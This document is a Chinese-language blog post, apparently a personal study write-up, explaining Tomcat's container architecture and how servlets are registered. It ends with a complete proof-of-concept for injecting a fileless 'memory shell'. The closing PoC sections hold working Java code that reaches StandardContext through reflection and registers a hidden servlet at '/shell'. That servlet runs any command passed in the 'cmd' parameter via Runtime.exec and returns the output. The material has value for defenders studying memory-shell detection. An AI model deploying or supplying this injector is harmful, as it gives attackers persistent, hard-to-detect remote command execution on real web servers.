# 前言

​	之前看了Filter内存马后，发现整个Tomcat内存马的实现思想其实是差不多的，都是在运行过程中去动态注册响应组件，就只看了filter，最近面试的时候，师傅问到了我整个的注册流程，还有点忘了，又把Filter内存马去看了一遍，主要是获取一个Web应用，即StandardContext，里面有FilterMaps，FilterDef，FilterConfigs，搞清楚这三个里面封装的什么，最后用反射修改内容，在ApplicationFilterFactory的createFilterChain中操作filterchain动态注册一个filter到最前面

​	实际上，虽然思想差不多，但是动态注册的流程还是各有差异，所以，还是想着再来看看servlet内存马

# 了解Servlet

Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。

使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。

从宏观上来看，Tomcat其实是Web服务器和Servlet容器的结合体。 

```
Web服务器：通俗来讲就是将某台主机的资源文件映射成URL供给外界访问。（比如访问某台电脑上的图片文件）
Servlet容器：顾名思义就是存放Servlet对象的东西，Servlet主要作用是处理URL请求。（接受请求、处理请求、响应请求）
```

Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：

```
Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。

Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml。

Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。

Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。 
```

<img src="/Users/DawnT0wn/Library/Application Support/typora-user-images/image-20230304164131252.png" alt="image-20230304164131252" style="zoom:50%;" />

## 简单的Servlet

有三种创建Servlet的方式

1. 实现`javax.servlet.Servlet`接口的方式
2. 继承`GenericServlet`类创建Servlet
3. 实现HttpServlet接口

一般我们都用的第一种或者第三种，第三种就是重写doGet和doPost方法

第一种：

```
package servlet;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet("/aaa")
public class ServletTest implements Servlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
        System.out.println("init...");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        System.out.println("service...");
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
        System.out.println("destroy..");
    }
}
```

1. GenericServlet 是实现了 Servlet 接口的抽象类。
2. HttpServlet 是 GenericServlet 的子类，具有 GenericServlet 的一切特性。
3. Servlet 程序（MyServlet 类）是一个实现了 Servlet 接口的 Java 类。

# 调用流程分析

![image-20230304164545487](images/1.png)

在调用ServletTest的service方法时，我们看到调用栈，其实和Filter的非常像，由此可以看出来tomcat中组件的加载流程servlet是在filter之后的，在ApplicationFilterChain的internalDoFilter方法中，调用了this.servlet.service

![image-20230304164712549](images/2.png)

我们来看看这个servlet是怎么设置的

在分析filter的时候我们知道了这个ApplicationFilterChain的实例是通过ApplicationFilterFactory的createFilterChain方法来得到的

![image-20230304165008318](images/3.png)

最后一路调用到了service

![image-20230304165103174](images/4.png)

之前我们说在这个方法中，创建了一个ApplicationFilterChain并返回，提到的都是有关于Filter的内容，其实在40行也对这个类设置了servlet，其实这里就是设置了我们最后调用的servlet

![image-20230304165225512](images/5.png)

继续往前看，在StandarWrappeerValve的invoke中，在createFilterChain前通过wrapper获取到了servlet

![image-20230304165357467](images/6.png)

# 内存马注入方式分析

在上面，我们看到了servlet的调用流程，但是这里都是在xml文件中或者通过注解方式配置的Servlet，对于内存马注入的话，我们需要实现在代码层面去动态注册这样一个servlet进内存中，然后在访问对应路由的时候调用恶意servlet的service方法

在Filter中，我们在知道了ServletContext中有对应createFilter调用addFilter向ServletContext实例化一个指定的filter，但是只是在启动的过程中，实现类在ApplicationContext，但是我们最后还是通过去操作FilterChain去添加的filter

与此类似，在ServletContext中也有CreateServlet调用addServlet方法，实现类也在ApplicationContext

```
private ServletRegistration.Dynamic addServlet(String servletName, String servletClass, Servlet servlet, Map<String, String> initParams) throws IllegalStateException {
    if (servletName != null && !servletName.equals("")) {
        if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {
            throw new IllegalStateException(sm.getString("applicationContext.addServlet.ise", new Object[]{this.getContextPath()}));
        } else {
            Wrapper wrapper = (Wrapper)this.context.findChild(servletName);
            if (wrapper == null) {
                wrapper = this.context.createWrapper();
                wrapper.setName(servletName);
                this.context.addChild(wrapper);
            } else if (wrapper.getName() != null && wrapper.getServletClass() != null) {
                if (!wrapper.isOverridable()) {
                    return null;
                }

                wrapper.setOverridable(false);
            }

            ServletSecurity annotation = null;
            if (servlet == null) {
                wrapper.setServletClass(servletClass);
                Class<?> clazz = Introspection.loadClass(this.context, servletClass);
                if (clazz != null) {
                    annotation = (ServletSecurity)clazz.getAnnotation(ServletSecurity.class);
                }
            } else {
                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                if (this.context.wasCreatedDynamicServlet(servlet)) {
                    annotation = (ServletSecurity)servlet.getClass().getAnnotation(ServletSecurity.class);
                }
            }

            if (initParams != null) {
                Iterator var9 = initParams.entrySet().iterator();

                while(var9.hasNext()) {
                    Map.Entry<String, String> initParam = (Map.Entry)var9.next();
                    wrapper.addInitParameter((String)initParam.getKey(), (String)initParam.getValue());
                }
            }

            ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, this.context);
            if (annotation != null) {
                registration.setServletSecurity(new ServletSecurityElement(annotation));
            }

            return registration;
        }
    } else {
        throw new IllegalArgumentException(sm.getString("applicationContext.invalidServletName", new Object[]{servletName}));
    }
}
```

整个流程和addFilter类似，首先判断servletName是否为空

1. 首先判断程序是否处于运行状态，如果是运行状态则会抛出异常
2. 从context中根据servletName查找对于child并转化为Wrapper对象（StandardContext和Wrapper都是ContainBase的子类）
3. 如果没有找到wrapper，通过createWrapper方法创建一个wrapper对象，并将这个wrapper添加到context到child中去
4. 如果servlet为空的话，会创建一个servletClass并加载这个class，如果不为空的话，会向wrapper中设置servletclass和servlet
5. 如果存在初始化参数，则会进行相关的初始化操作
6. 最后实例化ApplicationServletRegistration类，装入wrapper和context，最后返回

和Filter一样，如果程序运行时则不能添加Servlet

在一次访问到达 Tomcat 时，是如何匹配到具体的 Servlet 的？这个过程简单一点，只有两部走：

- ApplicationServletRegistration 的 `addMapping` 方法调用 `StandardContext#addServletMappingDecoded` 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）

![image-20230304174147946](images/7.png)

- 同时在 servletMappings 中添加 URL 路径与 name 的映射。

![image-20230304174236938](images/8.png)

其wrapper是通过调用`findChild`带上ServletName获取到的，之后通过wrapper.addMapping增添了映射

明白了servlet怎么去添加与URL路径的绑定后，大概就明白了整个注入的过程

1. 获取StandardContext对象
2. 自己创建一个恶意的Servlet
3. 利用StandardContext的createWrapper创建一个wrapper对象，并将servlet封装进去
4. 将封装好的wrapper对象添加到StandardContext的Children里面去
5. 调用addServletMappingDecoded添加url映射

# POC编写

和filter不同，servlet不需要像filerconfigs，filtermaps这些去寻找路径绑定，而servlet只需要将其封装进wrapper中，添加到context中，调用addServletMappingDecoded方法进行绑定即可

首先还是获取StandardContext，这里和filter判断是否存在的方式不一样，filter是通过`filterConfigs.get(name) == null`来判断的，而servlet是通过`servletContext.getServletRegistration(name) == null`来判断

获取的方式可以是通过ServletContext获取到ApplicationContext，在去获取StandardContext

```
ServletContext servletContext = req.getServletContext();
Field field = servletContext.getClass().getDeclaredField("context");
field.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

另外一种是循环去获取StandardContext，其实思想都差不多

```
ServletContext servletContext = req.getServletContext();
if (servletContext.getServletRegistration(name) == null) {
    StandardContext standardContext = null;

    while (standardContext == null) {

        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        Object object = field.get(servletContext);

        if (object instanceof ServletContext) {
            servletContext = (ServletContext) object;
        } else if (object instanceof StandardContext) {
            standardContext = (StandardContext) object;
        }
    }
    
}
```

接下来创建一个恶意的Servlet

```
Servlet servlet = new Servlet() {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            if (servletRequest.getParameter("cmd") != null) {
                Process process = Runtime.getRuntime().exec(servletRequest.getParameter("cmd"));
                InputStream inputStream = process.getInputStream();
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    servletResponse.getWriter().println(line);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
};
```

创建wrapper并添加到StandarContext中，然后设置路由绑定

```
Wrapper wrapper = standardContext.createWrapper();
 wrapper.setServlet(servlet);
 wrapper.setName(name);
// wrapper.setServletClass(servlet.getClass().getName());
 wrapper.setLoadOnStartup(1);      //设置启动优先级
 standardContext.addChild(wrapper);
 standardContext.addServletMappingDecoded("/shell",name);
```

完整的poc

```
package servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

@WebServlet("/addServlet")
public class AddTomcatServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{
        this.doPost(req,resp);
    }

    @Override
    protected void doPost(HttpServletRequest req,HttpServletResponse resp) throws ServletException,IOException{
        try{
            String name = "DawnT0wn";
            ServletContext servletContext = req.getServletContext();
            if (servletContext.getServletRegistration(name) == null) {
                StandardContext standardContext = null;

                while (standardContext == null) {

                    Field field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object object = field.get(servletContext);

                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        standardContext = (StandardContext) object;
                    }

                }
//                Field field = servletContext.getClass().getDeclaredField("context");
//                field.setAccessible(true);
//                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
//
//                Field stdctx = applicationContext.getClass().getDeclaredField("context");
//                stdctx.setAccessible(true);
//                StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

                Servlet servlet = new Servlet() {
                    @Override
                    public void init(ServletConfig servletConfig) throws ServletException {

                    }

                    @Override
                    public ServletConfig getServletConfig() {
                        return null;
                    }

                    @Override
                    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                        try {
                            if (servletRequest.getParameter("cmd") != null) {
                                Process process = Runtime.getRuntime().exec(servletRequest.getParameter("cmd"));
                                InputStream inputStream = process.getInputStream();
                                InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
                                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                                String line;
                                while ((line = bufferedReader.readLine()) != null) {
                                    servletResponse.getWriter().println(line);
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public String getServletInfo() {
                        return null;
                    }

                    @Override
                    public void destroy() {

                    }
                };
                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setServlet(servlet);
                wrapper.setName(name);
//                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setLoadOnStartup(1);      //设置启动优先级

                standardContext.addChild(wrapper);
                standardContext.addServletMappingDecoded("/shell",name);

                resp.getWriter().println("Servlet Add");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```



参考链接：

https://blog.csdn.net/angry_program/article/details/118492214

https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC

https://www.freebuf.com/vuls/344296.html